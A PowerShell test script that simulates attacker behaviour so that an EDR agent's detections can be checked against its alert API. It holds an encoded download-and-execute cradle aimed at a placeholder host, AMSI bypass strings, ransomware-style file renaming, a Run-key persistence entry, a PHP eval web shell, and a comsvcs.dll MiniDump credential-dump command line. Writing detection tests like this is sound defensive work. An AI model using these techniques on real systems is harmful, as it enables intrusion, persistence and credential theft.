param(
  [string]$ApiBase = "http://127.0.0.1:8080/api/v1",
  [string]$EndpointId = $env:COMPUTERNAME,
  [string]$Tenant = "demo-tenant",
  [string]$BearerToken = "",
  [string]$WebRoot = "",
  [int]$WaitSeconds = 90,
  [string]$OutFile = "",
  [switch]$SkipApiCheck,
  [switch]$EnablePersistence,
  [switch]$EnableWebShell,
  [switch]$EnableTls,
  [switch]$EnableLsassCommandLine,
  [switch]$NoCleanup
)

$ErrorActionPreference = "Stop"

if (-not $IsWindows -and $env:OS -ne "Windows_NT") {
  throw "windows_sensor_e2e.ps1 must run on a Windows endpoint with the EDR Agent installed."
}

$RunId = "EDR-SENSOR-E2E-{0}" -f ([Guid]::NewGuid().ToString("N").Substring(0, 12))
$StartedAt = (Get-Date).ToUniversalTime().ToString("o")
$WorkDir = Join-Path $env:TEMP $RunId
$ScenarioResults = New-Object System.Collections.Generic.List[object]
$CreatedPaths = New-Object System.Collections.Generic.List[string]
$CreatedRegistryValues = New-Object System.Collections.Generic.List[object]

if ([string]::IsNullOrWhiteSpace($OutFile)) {
  $OutFile = Join-Path $env:TEMP ("{0}-result.json" -f $RunId)
}

function Add-ScenarioResult {
  param(
    [string]$Name,
    [string]$Status,
    [string]$ExpectedSignal,
    [string]$Detail = ""
  )
  $ScenarioResults.Add([ordered]@{
    name = $Name
    status = $Status
    expected_signal = $ExpectedSignal
    detail = $Detail
  }) | Out-Null
}

function Invoke-Scenario {
  param(
    [string]$Name,
    [string]$ExpectedSignal,
    [scriptblock]$Body
  )
  Write-Host ("==> {0}" -f $Name)
  try {
    & $Body
    Add-ScenarioResult -Name $Name -Status "triggered" -ExpectedSignal $ExpectedSignal
  } catch {
    Add-ScenarioResult -Name $Name -Status "failed" -ExpectedSignal $ExpectedSignal -Detail $_.Exception.Message
    Write-Warning ("scenario failed: {0}: {1}" -f $Name, $_.Exception.Message)
  }
}

function Invoke-ApiGet {
  param([string]$Path)
  $headers = @{}
  if (-not [string]::IsNullOrWhiteSpace($BearerToken)) {
    $headers["Authorization"] = "Bearer $BearerToken"
  }
  $uri = "{0}/{1}" -f $ApiBase.TrimEnd("/"), $Path.TrimStart("/")
  Invoke-RestMethod -Method Get -Uri $uri -Headers $headers -TimeoutSec 20
}

New-Item -ItemType Directory -Force -Path $WorkDir | Out-Null
$CreatedPaths.Add($WorkDir) | Out-Null

Write-Host ("RunId: {0}" -f $RunId)
Write-Host ("Endpoint: {0}, Tenant: {1}" -f $EndpointId, $Tenant)

Invoke-Scenario -Name "powershell_scriptblock_amsi" -ExpectedSignal "script_sensor,script_or_encoded_payload,pmfe_scan" -Body {
  $ps = @"
`$run = '$RunId'
Write-Output "EDR_SENSOR_E2E_RUN=`$run sensor=scriptblock provider=Microsoft-Windows-PowerShell"
`$payload = "IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/edr/`$run.ps1'); AmsiUtils amsiInitFailed FromBase64String"
Write-Output `$payload
"@
  $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($ps))
  $p = Start-Process -FilePath "powershell.exe" -ArgumentList @("-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", $encoded) -PassThru -WindowStyle Hidden
  $p.WaitForExit(15000) | Out-Null
}

Invoke-Scenario -Name "ransom_file_rate_counter" -ExpectedSignal "ransom_behavior" -Body {
  $dir = Join-Path $WorkDir "ransom-counter"
  New-Item -ItemType Directory -Force -Path $dir | Out-Null
  $CreatedPaths.Add($dir) | Out-Null
  for ($i = 0; $i -lt 140; $i++) {
    $path = Join-Path $dir ("doc-{0:D3}.txt" -f $i)
    $newPath = Join-Path $dir ("doc-{0:D3}.{1}.locked" -f $i, $RunId)
    Set-Content -Path $path -Value ("EDR_SENSOR_E2E_RUN={0}; file={1}; benign test data" -f $RunId, $i) -Encoding ASCII
    Rename-Item -Path $path -NewName (Split-Path $newPath -Leaf)
  }
}

if ($EnablePersistence) {
  Invoke-Scenario -Name "registry_runkey_persistence" -ExpectedSignal "persistence_change" -Body {
    $key = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $value = "EDR_SENSOR_E2E_$RunId"
    $data = "powershell.exe -NoProfile -WindowStyle Hidden -Command `"Write-Output $RunId persistence_change_indicator`""
    New-ItemProperty -Path $key -Name $value -Value $data -PropertyType String -Force | Out-Null
    $CreatedRegistryValues.Add([ordered]@{ path = $key; name = $value }) | Out-Null
  }
} else {
  Add-ScenarioResult -Name "registry_runkey_persistence" -Status "skipped" -ExpectedSignal "persistence_change" -Detail "pass -EnablePersistence to run"
}

if ($EnableWebShell) {
  Invoke-Scenario -Name "webshell_file_semantic" -ExpectedSignal "webshell_semantic,webshell_files,pmfe_scan" -Body {
    if ([string]::IsNullOrWhiteSpace($WebRoot)) {
      throw "WebRoot is required when -EnableWebShell is set."
    }
    if (-not (Test-Path $WebRoot)) {
      throw "WebRoot does not exist: $WebRoot"
    }
    $file = Join-Path $WebRoot ("edr_sensor_e2e_{0}.php" -f $RunId)
    $php = "<?php /* EDR_SENSOR_E2E_RUN=$RunId */ `$x = `$_POST['x']; eval(base64_decode(`$x)); ?>"
    Set-Content -Path $file -Value $php -Encoding ASCII
    $CreatedPaths.Add($file) | Out-Null
  }
} else {
  Add-ScenarioResult -Name "webshell_file_semantic" -Status "skipped" -ExpectedSignal "webshell_semantic,webshell_files,pmfe_scan" -Detail "pass -EnableWebShell -WebRoot <path> to run"
}

if ($EnableTls) {
  Invoke-Scenario -Name "tls_cert_anomaly" -ExpectedSignal "tls_anomaly" -Body {
    try {
      $req = [Net.WebRequest]::Create("https://expired.badssl.com/")
      $req.Timeout = 5000
      $resp = $req.GetResponse()
      $resp.Close()
    } catch {
      Write-Host ("expected TLS request error observed: {0}" -f $_.Exception.Message)
    }
  }
} else {
  Add-ScenarioResult -Name "tls_cert_anomaly" -Status "skipped" -ExpectedSignal "tls_anomaly" -Detail "pass -EnableTls to run"
}

if ($EnableLsassCommandLine) {
  Invoke-Scenario -Name "lsass_minidump_commandline" -ExpectedSignal "credential_dump_indicator,pmfe_scan" -Body {
    $dumpPath = Join-Path $WorkDir ("lsass-{0}.dmp" -f $RunId)
    $args = "C:\Windows\System32\comsvcs.dll, MiniDump 0 $dumpPath full"
    $p = Start-Process -FilePath "rundll32.exe" -ArgumentList $args -PassThru -WindowStyle Hidden
    $p.WaitForExit(5000) | Out-Null
    if (Test-Path $dumpPath) {
      $CreatedPaths.Add($dumpPath) | Out-Null
    }
  }
} else {
  Add-ScenarioResult -Name "lsass_minidump_commandline" -Status "skipped" -ExpectedSignal "credential_dump_indicator,pmfe_scan" -Detail "pass -EnableLsassCommandLine to run; this is command-line telemetry only and may be noisy"
}

Write-Host ("Waiting {0}s for Agent ingest and platform processing..." -f $WaitSeconds)
Start-Sleep -Seconds $WaitSeconds

$ApiResult = [ordered]@{
  checked = (-not $SkipApiCheck)
  alerts = @()
  error = $null
}

if (-not $SkipApiCheck) {
  try {
    $encodedRunId = [uri]::EscapeDataString($RunId)
    $res = Invoke-ApiGet -Path ("alerts?search={0}&endpoint_id={1}&limit=50" -f $encodedRunId, [uri]::EscapeDataString($EndpointId))
    if ($null -ne $res.data) {
      $ApiResult["alerts"] = @($res.data)
    }
  } catch {
    $ApiResult["error"] = $_.Exception.Message
    Write-Warning ("API verification failed: {0}" -f $_.Exception.Message)
  }
}

if (-not $NoCleanup) {
  foreach ($rv in $CreatedRegistryValues) {
    try {
      Remove-ItemProperty -Path $rv.path -Name $rv.name -ErrorAction SilentlyContinue
    } catch {
      Write-Warning ("cleanup registry failed: {0}" -f $_.Exception.Message)
    }
  }
  foreach ($path in $CreatedPaths) {
    try {
      if (Test-Path $path) {
        Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
      }
    } catch {
      Write-Warning ("cleanup path failed: {0}" -f $_.Exception.Message)
    }
  }
}

$Result = [ordered]@{
  run_id = $RunId
  started_at = $StartedAt
  endpoint_id = $EndpointId
  tenant = $Tenant
  api_base = $ApiBase
  wait_seconds = $WaitSeconds
  scenarios = @($ScenarioResults)
  api = $ApiResult
  cleanup = (-not $NoCleanup)
}

$Result | ConvertTo-Json -Depth 8 | Set-Content -Path $OutFile -Encoding UTF8
Write-Host ("Result written: {0}" -f $OutFile)
Write-Host "Search the alerts page for the RunId above if API verification is skipped or protected by auth."
